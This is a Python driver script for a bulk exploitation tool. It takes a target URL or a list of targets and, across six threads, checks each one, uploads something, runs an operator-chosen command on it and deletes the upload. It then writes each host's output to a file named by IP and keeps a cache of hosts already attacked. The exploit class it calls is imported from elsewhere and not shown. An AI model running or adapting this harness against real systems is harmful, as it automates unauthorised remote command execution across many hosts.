import os
import argparse
from urllib import parse
from lib.common.exploit import *
from concurrent.futures import ThreadPoolExecutor, as_completed


CACHELIST  = 'cache.txt'
OUTPUT_DIR = 'output'

def write_info(url, content):
    ip = parse.urlparse(url).netloc.split(':')[0]
    if isinstance(content, str):
        content = content.encode()
    # write cache file
    with open(CACHELIST, 'a') as f:
        f.write(ip+'\n')

    if not os.path.exists(OUTPUT_DIR):
        os.mkdir(OUTPUT_DIR)
    path = os.path.join(OUTPUT_DIR, ip)
    with open(path, 'wb') as f:
        f.write(content)

def worker(expobj: Exploit, cmd):
    if not expobj.check():
        return ErrorResult.content
    if expobj.upload() == ExploitStatus.SUCCESS:
        result = expobj.attack(cmd)
        expobj.clean()
        return result
    else:
        expobj.exploit.log("Forensic failed", "error")
        return ErrorResult.content


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url',   dest='url',  type=str, help='target url')
    parser.add_argument('-f', '--file',  dest='file', type=str, help='target file')
    parser.add_argument('-c', '--cmd',   dest='cmd',  type=str, help="execute command")
    parser.add_argument('--cache', dest='cache', action='store_true', help='enable cache')
    args = parser.parse_args()
    
    enable_cache = args.cache
    
    if args.url:
        exp = Exploit(args.url)
        result = worker(exp, args.cmd)
        if result != ErrorResult.content:
            write_info(args.url, result)
    elif args.file:
        with open(args.file, 'r') as f:
            targets = f.readlines()

        try:
            with open(CACHELIST, 'r') as f:
                cachelist = f.read().splitlines()
        except:
            cachelist = []

        tasks = {}
        with ThreadPoolExecutor(6) as pool:
            for target in targets:
                target = target.strip()
                # If the target is in the cache, it is skipped.
                if enable_cache:
                    ip = parse.urlparse(target).netloc.split(':')[0]
                    if ip in cachelist:
                        continue
                exp = Exploit(target)
                tasks[pool.submit(worker, exp, args.cmd)] = target

        for f in as_completed(tasks):
            result = f.result()
            if result == ErrorResult.content:
                continue
            write_info(tasks[f], result)

